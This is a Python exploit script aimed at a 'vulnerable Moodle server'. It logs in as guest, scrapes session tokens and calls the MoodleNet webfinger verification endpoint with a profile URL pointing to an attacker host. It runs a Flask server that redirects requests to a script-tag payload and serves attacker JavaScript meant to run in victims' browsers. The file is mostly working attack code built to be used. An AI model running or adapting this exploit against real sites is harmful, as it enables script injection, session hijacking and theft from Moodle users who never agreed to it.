import pwn
import requests
import argparse
from flask import Flask, redirect, send_file, request
import re
import threading


def parse_arguments():
    parser = argparse.ArgumentParser(description="Exploit")
    parser.add_argument("--ip", required=False, help="IP address to bind the server, needs to be your Public IP address")
    parser.add_argument("--port", type=int, required=False, help="Port to bind the server, needs to be accessible externally")
    parser.add_argument("--js", required=False, help="Path to the JavaScript file to serve at /js, this file will be executed in the victim's browser")
    parser.add_argument("--external-host", required=False, help="Use this parameter only if you want to serve the payload and jsfile on an external server")
    parser.add_argument("--target", required=True, help="Vulnerable Moodle server")
    

    args = parser.parse_args()



    if args.external_host:
        if any([args.ip, args.port, args.js]):
            parser.error("Do not provide --ip, --port, or --js when using --external-server-url.")
    else:
        if not all([args.ip, args.port, args.js]):
            parser.error("You must provide --ip, --port, and --js.")

    return args







def create_server(ip, port, payload, js):
    app = Flask(__name__)

    @app.route("/js")
    def serve_js():
        return send_file(js, mimetype="application/javascript")

    @app.route("/<path:path>")
    def redirect_all(path):
        return redirect("http://127.0.0.1/"+payload, code=302)

    app.run(host=ip, port=port)




def make_requests(host, target):

    session = requests.Session()
    

    #Get Login Token
    response = session.get(target+"/login/index.php")
    
    match = re.search(r'name="logintoken"\s+value="([^"]+)"', response.text)
    if match:
        token = match.group(1)
    
        


    #Login As guest
    data = {
        "username":"guest",
        "password":"guest",
        "logintoken":token
    }
    response = session.post(target+"/login/index.php", data=data)
    
    
    match = re.search(r'"sesskey"\s*:\s*"([^"]+)"', response.text)
    if match:
        sesskey = match.group(1)



    #Send Final Payload
    data = [{
        "index":0,
        "methodname":"tool_moodlenet_verify_webfinger",
        "args":{
            "section":1,
            "course":1,
            "profileurl":"hacked@94.237.39.49"
        }
    }]
    response = session.post(target+"/lib/ajax/service.php?sesskey="+sesskey, json=data)    
    
    print(response.text)

def main():
    args = parse_arguments()

    if args.external_host:
        make_requests(args.external_host, args.target)
    else:
        payload = '<script src="//{}/js"></script>'.format(args.ip, args.port)
        

        #Start the server on a thread
        server_thread = threading.Thread(
            target=create_server,
            args=(args.ip, args.port, payload, args.js)
        )
        server_thread.start()
        

        host = args.ip+":"+str(args.port)
        make_requests(host, args.target)


        server_thread.join()






if __name__ == "__main__":
    main()
    